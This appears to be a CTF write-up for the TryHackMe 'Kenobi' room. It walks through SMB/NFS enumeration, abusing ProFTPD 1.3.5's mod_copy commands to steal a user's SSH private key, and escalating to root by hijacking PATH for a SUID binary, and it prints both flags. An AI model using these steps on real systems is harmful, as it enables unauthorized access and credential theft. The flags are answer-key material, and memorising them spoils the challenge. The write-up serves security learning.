---
layout: post
title: Kenobi
categories: [CyberSecurity]
tags: [CTF, thm, easy, nmap, smb, ProFTPd, SUID]
---

![Kenobi](./assets/kenobi.png){: .right }{: w="200" h="200" }

## Walkthrough
[https://tryhackme.com/room/kenobi](https://tryhackme.com/room/kenobi)

**Difficulty level:** Easy

This room will cover accessing a Samba share, manipulating a vulnerable version of proftpd to gain initial access and escalate your privileges to root via an SUID binary.
## Task 1: Deploy the vulnerable machine
### Questions & Walk:
Q1. Make sure you're connected to our network and deploy the machine  
Q2. Scan the machine with nmap, how many ports are open?

As usual start with a nmap scan:
```bash
nmap -T4 -sC -sV -Pn -oN nmap/initial 10.10.226.246
```
{: .nolineno }

Count number of open ports. Q2 done

## Task 2: Enumerating Samba for shares

Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often referred to as a network file system.

Samba is based on the common client/server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network.

```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse MACHINE_IP
```
{: .nolineno }

SMB has two ports, 445 and 139.

SMB has two ports, 445 and 139.  
![image info](./assets/bkgVNy3.png)  
Using the nmap command above, how many shares have been found?  

### Questions & Walk:
Q1. Using the nmap command above, how many shares have been found?

> "3"

On most distributions of Linux smbclient is already installed. Lets inspect one of the shares.

```bash
smbclient //10.10.221.220/anonymous
```
{: .nolineno }

Using your machine, connect to the machines network share.

Q2. Once you're connected, list the files on the share. What is the file can you see?

> "log.txt"

You can recursively download the SMB share too. Submit the username and password as nothing.

```bash
smbget -R smb://10.10.221.220/anonymous
```
{: .nolineno }

Open the file on the share. There is a few interesting things found.

    Information generated for Kenobi when generating an SSH key for the user
    Information about the ProFTPD server.

Q3. What port is FTP running on?

> "21"

Your earlier nmap port scan will have shown port 111 running the service rpcbind. This is just a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve. 

In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.221.220
```
{: .nolineno }

Q4. What mount can we see?

> "/var"

## Task 3:  Gain initial access with ProFtpd 

ProFtpd is a free and open-source FTP server, compatible with Unix and Windows systems. Its also been vulnerable in the past software versions.

### Questions & Walk:

Lets get the version of ProFtpd. Use netcat to connect to the machine on the FTP port.

```bash
nc 10.10.221.220 21
```
{: .nolineno }

Q1. What is the version?

> "1.3.5"

We can use searchsploit to find exploits for a particular software version.
Searchsploit is basically just a command line search tool for exploit-db.com.

Q2. How many exploits are there for the ProFTPd running?

> "4"

You should have found an exploit from ProFtpd's mod_copy module. 

The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.

Q3. We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user. 

> "No answer needed"

We're now going to copy Kenobi's private key using SITE CPFR and SITE CPTO commands.

```bash
└─$ nc 10.10.221.220 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.221.220]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful

```
{: .nolineno }

Q4. We knew that the /var directory was a mount we could see (task 2, question 4). So we've now moved Kenobi's private key to the /var/tmp directory.

> "No answer needed"

Lets mount the /var/tmp directory to our machine

```bash
└─$ sudo mkdir /mnt/kenobiNFS
└─$ sudo mount 10.10.221.220:/var /mnt/kenobiNFS
└─$ ls -la /mnt/kenobiNFS
total 56
drwxr-xr-x 14 root root  4096 Sep  4  2019 .
drwxr-xr-x  3 root root  4096 Jan 22 14:28 ..
drwxr-xr-x  2 root root  4096 Sep  4  2019 backups
drwxr-xr-x  9 root root  4096 Sep  4  2019 cache
drwxrwxrwt  2 root root  4096 Sep  4  2019 crash
drwxr-xr-x 40 root root  4096 Sep  4  2019 lib
drwxrwsr-x  2 root staff 4096 Apr 12  2016 local
lrwxrwxrwx  1 root root     9 Sep  4  2019 lock -> /run/lock
drwxrwxr-x 10 root avahi 4096 Sep  4  2019 log
drwxrwsr-x  2 root mail  4096 Feb 26  2019 mail
drwxr-xr-x  2 root root  4096 Feb 26  2019 opt
lrwxrwxrwx  1 root root     4 Sep  4  2019 run -> /run
drwxr-xr-x  2 root root  4096 Jan 29  2019 snap
drwxr-xr-x  5 root root  4096 Sep  4  2019 spool
drwxrwxrwt  6 root root  4096 Jan 22 14:25 tmp
drwxr-xr-x  3 root root  4096 Sep  4  2019 www
```
{: .nolineno }

We now have a network mount on our deployed machine! We can go to /var/tmp and get the private key then login to Kenobi's account.

```bash
└─$ cp /mnt/kenobiNFS/tmp/id_rsa .
└─$ sudo chmod 600 id_rsa                       
└─$ ssh -i id_rsa kenobi@10.10.221.220
The authenticity of host '10.10.221.220 (10.10.221.220)' can't be established.
ED25519 key fingerprint is SHA256:GXu1mgqL0Wk2ZHPmEUVIS0hvusx4hk33iTcwNKPktFw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.221.220' (ED25519) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ ls
share  user.txt
kenobi@kenobi:~$ cat user.txt
d0b0f3f53b6caa532a83915e19224899
```
{: .nolineno }

Q5. What is Kenobi's user flag (/home/kenobi/user.txt)?

>  "d0b0f3f53b6caa532a83915e19224899"


## Task 3: Privilege Escalation with Path Variable Manipulation 

![image info](./assets/suid.png)  
Lets first understand what what SUID, SGID and Sticky Bits are.  
![image info](./assets/suid2.png) 

### Questions & Walk:

SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues.

To search the a system for these type of files run the following: 

```bash
find / -perm -u=s -type f 2>/dev/null
```
{: .nolineno }

Q1. What file looks particularly out of the ordinary? 

> "/usr/bin/menu"

Q2. Run the binary, how many options appear?

> "3"

```bash
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
```
{: .nolineno }

This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname).

As this file runs as the root users privileges, we can manipulate our path gain a root shell.

```bash
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
# whoami
root

```
{: .nolineno }

Q3. We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root!

> "No answer needed"

Q4. What is the root flag (/root/root.txt)?

> "177b3cd8562289f37382721c28381f02"

```bash
# cd ..
# ls
bin   dev  home        initrd.img.old  lib64       media  opt   root  sbin  srv  tmp  var      vmlinuz.old
boot  etc  initrd.img  lib             lost+found  mnt    proc  run   snap  sys  usr  vmlinuz
# cd root
# ls
root.txt
# cat root.txt
177b3cd8562289f37382721c28381f02

```
{: .nolineno }
